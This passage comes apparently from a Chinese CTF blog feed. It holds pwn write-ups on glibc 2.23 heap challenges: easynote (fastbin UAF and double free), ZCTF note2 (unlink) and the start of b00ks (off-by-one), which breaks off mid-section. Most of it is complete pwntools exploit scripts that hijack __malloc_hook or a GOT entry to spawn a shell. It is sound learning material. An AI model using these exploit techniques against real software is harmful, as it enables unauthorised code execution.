class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./easynote&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29354)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">creat</span>(<span class="hljs-params">lenth,content</span>):<br>    ru(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    sd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;The length of your content ---&gt;&quot;</span>)<br>    sd(<span class="hljs-built_in">str</span>(lenth))<br>    rl()<br>    sd(content)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    ru(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    sd(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;Index ---&gt;&quot;</span>)<br>    sd(<span class="hljs-built_in">str</span>(index).encode())<br>    ru(<span class="hljs-string">&quot;---&gt;\n&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    ru(<span class="hljs-string">&quot;---&gt;\n&quot;</span>)<br>    sd(content)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    sd(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index ---&gt;\n&#x27;</span>)   <br>    sd(<span class="hljs-built_in">str</span>(index))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    sd(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index ---&gt;\n&#x27;</span>)<br>    sd(<span class="hljs-built_in">str</span>(index))<br><br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;AAAAAA&#x27;</span>)<span class="hljs-comment">#0</span><br>creat(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;AAAAAA&#x27;</span>)<span class="hljs-comment">#1</span><br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;AAAAA&#x27;</span>)<span class="hljs-comment">#2</span><br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;AAAAA&#x27;</span>)<span class="hljs-comment">#3</span><br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>show(<span class="hljs-number">1</span>)<br>__malloc_hook_addr=u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span>-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__malloc_hook_addr))<br>libc=ELF(<span class="hljs-string">&#x27;/home/kali/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;./libc64-2.23.so&#x27;)</span><br>libc_base=__malloc_hook_addr-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>realloc = libc_base +libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>onegadget=libc_base+<span class="hljs-number">0xf1247</span><br>fake_addr=__malloc_hook_addr-<span class="hljs-number">0x20</span>-<span class="hljs-number">3</span><br>creat(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;AAAA&#x27;</span>)<span class="hljs-comment">#4=1</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>,p64(fake_addr))<br><span class="hljs-comment">#debug()</span><br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(onegadget)+p64(realloc+<span class="hljs-number">4</span>))<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause(1)</span><br>debug()<br>creat(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;AA&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h5 id="另外一种：double-free"><a href="#另外一种：double-free" class="headerlink" title="另外一种：double free"></a>另外一种：double free</h5><p>泄露出libc以后,free多次</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br></code></pre></td></tr></table></figure><p>然后在创建的时候改fd指针</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,p64(fake_addr)</span></span>)<br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,b<span class="hljs-string">&#x27;AA&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,p64(fake_addr)</span></span>)<br><span class="hljs-function"><span class="hljs-title">creat</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,b<span class="hljs-string">&#x27;B&#x27;</span>*(<span class="hljs-number">0</span>x13-<span class="hljs-number">8</span>)</span></span>+<span class="hljs-built_in">p64</span>(onegadget)+<span class="hljs-built_in">p64</span>(realloc+<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure><p>free两次后</p><p><img src="D:\刷题wp\picture\image-20240228113957845.png" alt="image-20240228113957845"></p><p>free三次后</p><p><img src="D:\刷题wp\picture\image-20240228114020469.png" alt="image-20240228114020469"></p><p>连接情况2-&gt;3-&gt;2</p><p>第一次创建:</p><p>3-&gt;2-&gt;fake_addr</p><p><img src="D:\刷题wp\picture\image-20240228114159776.png" alt="image-20240228114159776"></p><p>第二次创建：</p><p>2-&gt;fake_addr</p><p>第三次创建：</p><p>fake_addr</p><p>第四次创建就在fake_addr出写入数据了。</p><p>总exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./easynote&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29354)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">creat</span>(<span class="hljs-params">lenth,content</span>):<br>    ru(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    sd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;The length of your content ---&gt;&quot;</span>)<br>    sd(<span class="hljs-built_in">str</span>(lenth))<br>    rl()<br>    sd(content)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    ru(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    sd(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;Index ---&gt;&quot;</span>)<br>    sd(<span class="hljs-built_in">str</span>(index).encode())<br>    ru(<span class="hljs-string">&quot;---&gt;\n&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    ru(<span class="hljs-string">&quot;---&gt;\n&quot;</span>)<br>    sd(content)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    sd(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index ---&gt;\n&#x27;</span>)   <br>    sd(<span class="hljs-built_in">str</span>(index))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    sd(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index ---&gt;\n&#x27;</span>)<br>    sd(<span class="hljs-built_in">str</span>(index))<br><br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;AAAAAA&#x27;</span>)<span class="hljs-comment">#0</span><br>creat(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;AAAAAA&#x27;</span>)<span class="hljs-comment">#1</span><br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;AAAAA&#x27;</span>)<span class="hljs-comment">#2</span><br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;AAAAA&#x27;</span>)<span class="hljs-comment">#3</span><br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;AAAAA&#x27;</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>show(<span class="hljs-number">1</span>)<br>__malloc_hook_addr=u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span>-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__malloc_hook_addr))<br>libc=ELF(<span class="hljs-string">&#x27;/home/kali/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;./libc64-2.23.so&#x27;)</span><br>libc_base=__malloc_hook_addr-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>onegadget=libc_base+<span class="hljs-number">0xf1247</span><br>realloc = libc_base +libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>fake_addr=__malloc_hook_addr-<span class="hljs-number">0x20</span>-<span class="hljs-number">3</span><br>creat(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;AAAA&#x27;</span>)<span class="hljs-comment">#5=1</span><br><span class="hljs-comment">#debug()</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>debug()<br>free(<span class="hljs-number">2</span>)<br>debug()<br>creat(<span class="hljs-number">0x60</span>,p64(fake_addr))<br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;AA&#x27;</span>)<br>creat(<span class="hljs-number">0x60</span>,p64(fake_addr))<br>creat(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(onegadget)+p64(realloc+<span class="hljs-number">4</span>))<br><br>creat(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;AA&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><ul><li><p>总结：</p><p>以前看double free,总以为很难很难的样子，实际上动手调一调看看，也就是基本的uaf罢了。不要只看理论讲解就被吓懵哦。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2016 ZCTF note2--unlink</title>
    <link href="/2024/10/23/2016%20ZCTF%20note2--unlink/"/>
    <url>/2024/10/23/2016%20ZCTF%20note2--unlink/</url>
    
    <content type="html"><![CDATA[<h2 id="2016-ZCTF-note2–unlink"><a href="#2016-ZCTF-note2–unlink" class="headerlink" title="2016 ZCTF note2–unlink"></a>2016 ZCTF note2–unlink</h2><p>很久没打unlink了，上一次打unlink还是将近一年前,<del>如此怠惰</del></p><p>温习了一下重命名，重新指定类型啥的ida操作（重新指定类型没用上:{)</p><p>溢出点：</p><p>其中 i 是 unsigned 类型，lenth 为 int 类型，所以两者在 for 循环相比较的时候，lenth -1 的结果会被视为 unsigned 类型</p><p><img src="D:\刷题wp\picture\image-20240229204334021.png" alt="image-20240229204334021"></p><p>输入0也可以符合这个判断</p><p><img src="D:\刷题wp\picture\image-20240229204312924.png" alt="image-20240229204312924"></p><p>unlink需要伪造堆块，保证fd-&gt;bk &#x3D;&#x3D; p &#x3D;&#x3D; bk-&gt;fd,同时,要保证下一个块的prev_size与伪造的堆块大小相符。</p><p>主要是为了复健，就不多描述了。</p><p>长知识：chunk0伪造的块，中间有chunk1，释放chunk2,也可以与chunk0去合并。</p><p>从管理的index_of_chunk来看，1被free掉后重新创建占据了3的位置。</p><p>伪造堆块这两种都可以</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload<span class="hljs-number">1</span> = b<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">8</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x61)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(fd)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(bk)</span> + b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">40</span> +p<span class="hljs-number">64</span><span class="hljs-comment">(0x60)</span><br><span class="hljs-attr">#payload1</span> = b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>+ p<span class="hljs-number">64</span><span class="hljs-comment">(0xa1)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(fd)</span> +p<span class="hljs-number">64</span><span class="hljs-comment">(bk)</span><br><br></code></pre></td></tr></table></figure><p>第一个是自己手动填了后一个的pre_size是0x60</p><p>第二个直接算出来到chunk2的pre_size的长度。</p><p>delete之后number没有–,所以一直在往下占用index_of_chunk。</p><blockquote><p>写的十分简略，只记录了我在复健的问题，详细可以参考ctfwiki</p></blockquote><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./note2&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,25695)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>index_of_chunk = <span class="hljs-number">0x602120</span><br>fd = index_of_chunk - <span class="hljs-number">0x18</span><br>bk = index_of_chunk - <span class="hljs-number">0x10</span><br>atoi_got = <span class="hljs-number">0x602088</span><br><br>sl(<span class="hljs-string">b&quot;AA&quot;</span>)<br>sl(<span class="hljs-string">b&quot;BB&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">lenth,content</span>):<br>    ru(<span class="hljs-string">&quot;option&quot;</span>)<br>    sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Input the length of the note content:(less than 128)\n&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(lenth))<br>    ru(<span class="hljs-string">&#x27;content&#x27;</span>)<br>    sl(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">&#x27;option&#x27;</span>)<br>    sl(<span class="hljs-string">b&quot;2&quot;</span>)<br>    rl()<br>    sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">&#x27;option&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    rl()<br>    sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    ru(<span class="hljs-string">&#x27;option&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    rl()<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    rl()<br>    sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    rl()<br>    sl(content)<br><br><br><br><span class="hljs-comment">#debug()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#test of def</span><br><span class="hljs-string">new(0x10,b&quot;AAAAAAA&quot;)</span><br><span class="hljs-string">edit(0,b&#x27;BBBB&#x27;)</span><br><span class="hljs-string">show(0)</span><br><span class="hljs-string">dele(0)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload1 = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0x61</span>) + p64(fd) + p64(bk) + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">0x40</span> +p64(<span class="hljs-number">0x60</span>)<br><span class="hljs-comment">#payload1 = b&#x27;A&#x27;*8+ p64(0xa1) + p64(fd) +p64(bk)</span><br>new(<span class="hljs-number">0x80</span>,payload1)<span class="hljs-comment">#0</span><br>new(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;AA&quot;</span>)<span class="hljs-comment">#1</span><br>new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&quot;AA&quot;</span>)<span class="hljs-comment">#2</span><br><span class="hljs-comment">#debug()</span><br>dele(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0xa0</span>) + p64(<span class="hljs-number">0x90</span>)<br>new(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#debug()</span><br>dele(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x18</span>)+p64(atoi_got)*<span class="hljs-number">4</span>)<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>atoi_addr = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#libc = ELF(&#x27;/home/kali/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;/home/kali/Desktop/libc-2.23.so&#x27;</span>)<br><br>libc_base = atoi_addr - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>one_gadget = libc_base + <span class="hljs-number">0xf02a4</span><br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">0</span>,p64(system_addr))<br>sl(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆溢出off-by-one (asis-ctf-2016 b00ks)</title>
    <link href="/2024/10/23/%E5%A0%86%E6%BA%A2%E5%87%BAoff-by-one%20(asis-ctf-2016%20b00ks)/"/>
    <url>/2024/10/23/%E5%A0%86%E6%BA%A2%E5%87%BAoff-by-one%20(asis-ctf-2016%20b00ks)/</url>
    
    <content type="html"><![CDATA[<h4 id="堆溢出off-by-one-asis-ctf-2016-b00ks"><a href="#堆溢出off-by-one-asis-ctf-2016-b00ks" class="headerlink" title="堆溢出off-by-one (asis-ctf-2016 b00ks)"></a>堆溢出off-by-one (asis-ctf-2016 b00ks)</h4><ul><li><p>libc-2.23</p></li><li><p>漏洞点：</p><p>author name 输入为32，也就是这里的a2&#x3D;32，经历了32次++a1后，a1[32]&#x3D;0，而这是第33位。</p><p><img src="D:\刷题wp\picture\image-20240311171053765.png" alt="image-20240311171053765"></p></li></ul><p>​其他地方对于这个scanf_s的调用正常，因为都是输入的size-1</p><p>​<img src="D:\刷题wp\picture\image-20240311171214863.png" alt="image-20240311171214863"></p><ul><li><p>创建堆块：</p><p>这个写着最大32，但是无妨，可以更大，需要注意的是，这里输入的size必须是十进制数。（以前做的题往往喜欢输入成0x20,0x30等等）（看了看以前做的题，都是用atoi转了，所以可以那么输入。）</p><p><img src="D:\刷题wp\picture\image-20240311192609058.png" alt="image-20240311192609058"></p></li></ul><blockquote><p>book_list以及author_name_list仍然保存一个地址，那个地址指向真正的数据域</p></blockquote><img src="D:\刷题wp\picture\image-20240311200626317.png" alt="image-20240311200626317"  /><p><img src="D:\刷题wp\picture\image-20240311200648904.png" alt="image-20240311200648904"></p><p>每一个book的存储大致形式：</p><p><img src="D:\刷题wp\picture\image-20240311201619738.png" alt="image-20240311201619738"></p><ul><li>用过的块的id同样不能再重复使用，最多20次对块的创建操作。</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(b<span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">31</span>+b<span class="hljs-string">&#x27;D&#x27;</span>*<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">new</span><span class="hljs-params">(b<span class="hljs-string">&#x27;140&#x27;</span>,b<span class="hljs-string">&#x27;AAAAAA&#x27;</span>,b<span class="hljs-string">&#x27;140&#x27;</span>,b<span class="hljs-string">&#x27;BBBBBB&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>泄露出book1的0x30大小的指挥块位置（这里指向的是id)</p><ul><li>还剩0x20e80，把它用完，让mmap再分配内存。</li></ul><p><img src="D:\刷题wp\picture\image-20240311213203345.png" alt="image-20240311213203345"></p><ul><li><p>这时候从heap里看不到那个新的很大的块，从控制块中找到它们。</p><p><img src="D:\刷题wp\picture\image-20240311213745883.png" alt="image-20240311213745883"></p></li><li><p>接下来把60覆盖成00</p><p><img 